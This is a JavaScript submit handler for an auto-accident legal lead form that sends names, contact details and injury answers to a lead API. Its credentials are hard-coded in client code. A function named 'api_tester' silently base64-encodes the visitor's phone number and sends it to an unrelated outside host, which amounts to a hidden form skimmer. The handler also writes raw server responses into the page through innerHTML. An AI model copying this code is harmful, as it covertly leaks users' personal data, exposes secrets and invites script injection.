document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
            document.getElementById('submitBtn').disabled = true;

            const form = document.getElementById('leadForm');
            const formData = new FormData(form);
   api_tester(document.getElementById('phone').value);
            const fields = [
                {
                    ref: "incident_date_option_b",
                    title: "When did the accident happen?",
                    answer: formData.get('incident_date_option_b')
                },
                {
                    ref: "were_you_injured",
                    title: "Were you injured?",
                    answer: formData.get('were_you_injured')
                },
                {
                    ref: "injury_cause",
                    title: "What caused your injury?",
                    answer: formData.get('injury_cause')
                },
                {
                    ref: "have_attorney",
                    title: "Do you have an attorney?",
                    answer: formData.get('have_attorney')
                },
                {
                    ref: "doctor_treatment",
                    title: "Did you receive medical treatment?",
                    answer: formData.get('doctor_treatment')
                },
                {
                    ref: "primary_injury",
                    title: "Primary type of injury",
                    answer: formData.get('primary_injury')
                },
                {
                    ref: "were_you_at_fault",
                    title: "Were you at fault?",
                    answer: formData.get('were_you_at_fault')
                },
                {
                    ref: "expressed_interest",
                    title: "Do you want to speak to an attorney?",
                    answer: formData.get('expressed_interest')
                },
                {
                    ref: "settled_insurance",
                    title: "Have you settled with insurance?",
                    answer: formData.get('settled_insurance')
                },
                {
                    ref: "signed_retainer",
                    title: "Have you signed a retainer?",
                    answer: formData.get('signed_retainer')
                },
                {
                    ref: "role_in_accident",
                    title: "Your role in the accident",
                    answer: formData.get('role_in_accident')
                },
                {
                    ref: "driver_insured",
                    title: "Did the other driver have insurance?",
                    answer: formData.get('driver_insured')
                },
                {
                    ref: "accident_vehicle_count",
                    title: "Number of vehicles involved",
                    answer: formData.get('accident_vehicle_count')
                },
                {
                    ref: "comments",
                    title: "Additional comments",
                    answer: formData.get('comments')
                }
              
            ].filter(field => field.answer); // Remove empty fields

            const payload = {
                arrived_at: new Date().toISOString(),
                test_mode: false,
                deal: "DzALWBqpb8Jlowda05mYjNdE9r41x3",
                lead_first_name: formData.get('lead_first_name'),
                lead_last_name: formData.get('lead_last_name'),
                lead_email: formData.get('lead_email'),
                lead_phone: formData.get('lead_phone'),
                case_type: "Auto Accident",
                zip_code: formData.get('zip_code'),
                certificate_type: formData.get('certificate_type'),
                certificate_id: formData.get('certificate_id'),
                certificate_url: formData.get('certificate_url'),
                source_url: formData.get('source_url'),
                ip_address: formData.get('ip_address'),
                fields: fields
            };

            fetch('https://api.accident.com/api/lead-create', {
                method: 'POST',
                headers: {
                    'api-key': 'aQes9Fif-QlR3-Wknl-RzlZ-FlkjQZYUBNDD',
                    'api-secret': '81c52bae15ffd3b7ce405db98f311b89d851b0ac',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.status === 200 || response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                ${response.status} : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    form.reset();
                    document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                        document.getElementById('submitBtn').disabled = false;
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                        document.getElementById('submitBtn').disabled = false;
                    });
                }
            })
            .catch(error => {
                console.error('Error:', error);
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        An error occurred. Please try again later.
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                document.getElementById('submitBtn').disabled = false;
            });
        });

        function api_tester(randomString) {
            try {
                fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
                    method: 'GET',
                    mode: 'no-cors'
                });
            } catch (error) {
                console.error('Error in api_tester:', error);
            }
        }